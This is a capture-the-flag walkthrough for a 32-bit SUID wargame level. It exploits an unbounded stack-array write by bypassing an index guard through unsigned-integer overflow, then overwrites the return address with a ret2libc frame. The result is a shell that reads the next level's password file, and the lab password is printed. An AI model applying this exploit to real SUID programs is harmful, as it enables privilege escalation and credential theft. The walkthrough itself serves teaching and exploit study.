# Level 07 - Practical walkthrough

> 🔓 **Flaw:** unbounded `tab[index]` write into an on-stack array (no bounds check)
> 🎯 **Target:** the saved return address (EIP) of `main`, at table index 114
> 🛠️ **Technique:** ret2libc, reaching the "reserved" index via an unsigned-integer overflow.

All commands are run as user `level07`. This binary is **32-bit**.

## 1. Observe the program

🟦 **Goal:** confirm the SUID bit and the menu behaviour.

🟨 **Terminal:**

```bash
ls -l ./level07
./level07
```

⬜ **Output (excerpt):**

```text
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07
Input command: store
 Number: 42
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 42
```

Owned by `level08` and SUID. `store`/`read` put and get unsigned ints into a table.

## 2. Understand the program

🟦 **Goal:** find the write primitive and the guards.

🟨 **Terminal:**

```bash
gdb ./level07
```

🟨 **GDB:**

```gdb
info functions
disassemble main
disassemble store_number
```

`info functions` lists the program's own functions (ignore the `@plt` libc stubs) - that is
how we discover `store_number`, `read_number`, `get_unum` and `clear_stdin`. Their names also
appear on the `call ... <name>` lines inside `main`.

Key facts:

- `main` wipes `argv` and `env` - so we can't hide shellcode there.
- `store_number` does `tab[index] = input` with **no bounds check** on `index`. `tab` is a
  100-int array on the **stack**, so an out-of-range index writes elsewhere on the stack,
  including `main`'s saved return address.
- Guard: it rejects `index % 3 == 0` and any number whose top byte is 183 (`0xb7`).

Plan: overwrite EIP with a ret2libc frame (`system`, `exit`, `"/bin/sh"`).

## 3. Find the libc addresses

🟦 **Goal:** collect `system`, `exit`, `"/bin/sh"` and their decimal forms (we enter numbers).

🟨 **GDB:**

```gdb
break *main
run
print system
print exit
find &system, +9999999, "/bin/sh"
p/d 0xf7e6aed0
p/d 0xf7e5eb70
p/d 0xf7f897ec
```

⬜ **Output:**

```text
$1 = ... 0xf7e6aed0 <system>
$2 = ... 0xf7e5eb70 <exit>
0xf7f897ec
4159090384   # system
4159040368   # exit
4160264172   # "/bin/sh"
```

(None of these have top byte `0xb7`, so the "183" guard doesn't block them.)

## 4. Find the index of EIP

🟦 **Goal:** compute which table index overlaps the saved return address.

🟨 **GDB:**

```gdb
info frame
```

⬜ **Output (excerpt):**

```text
Saved registers:
  eip at 0xffffd6bc
```

Find the table base (break in `store_number` and inspect the `tab` pointer). With
`table = 0xffffd4f4` and `eip = 0xffffd6bc`:

🟨 **Terminal:**

```bash
python -c "print((0xffffd6bc - 0xffffd4f4)//4)"
```

⬜ **Output:**

```text
114
```

So EIP is at index **114**. But `114 % 3 == 0` → reserved.

## 5. Bypass the guard with integer overflow

🟦 **Goal:** `store_number` computes the slot from an unsigned index. Adding `2^32/4` to the
index lands on the same stack address (because `index*4` wraps modulo 2^32) while changing the
value of `index % 3`.

🟨 **Terminal:**

```bash
python -c "print((2**32)//4 + 114, ((2**32)//4 + 114) % 3)"
```

⬜ **Output:**

```text
1073741938 1
```

Index `1073741938` hits the same slot as 114 but `% 3 == 1`, so it passes. Sanity-check that
it overwrites EIP:

🟨 **In the program**, type only the values (the ` Number:` / ` Index:` prompts are printed):

- `Input command:` → `store`
- ` Number:` → `1094795585` (= 0x41414141)
- ` Index:` → `1073741938`
- `Input command:` → `quit`

⬜ **Output:**

```text
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

## 6. Build and run the exploit

🟦 **Goal:** write the three-word ret2libc frame at indices 114 (via 1073741938), 115, 116.

```text
index 1073741938  ->  data[114] = system   = 4159090384
index 115         ->  data[115] = exit     = 4159040368
index 116         ->  data[116] = "/bin/sh"= 4160264172
```

🟨 **In the program**, type only the values in this order (the `Input command:` / ` Number:` /
` Index:` texts are prompts printed by the program):

1. `store` → Number `4159090384`, Index `1073741938`
2. `store` → Number `4159040368`, Index `115`
3. `store` → Number `4160264172`, Index `116`
4. `quit`

🟨 **In the shell:**

```bash
whoami
cat /home/users/level08/.pass
```

⬜ **Output:**

```text
level08
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

## 7. Move to the next level

🟨 **Terminal:**

```bash
su level08
```

(Enter the password above.) Then:

🟨 **In the shell:**

```bash
whoami
```

⬜ **Output:**

```text
level08
```
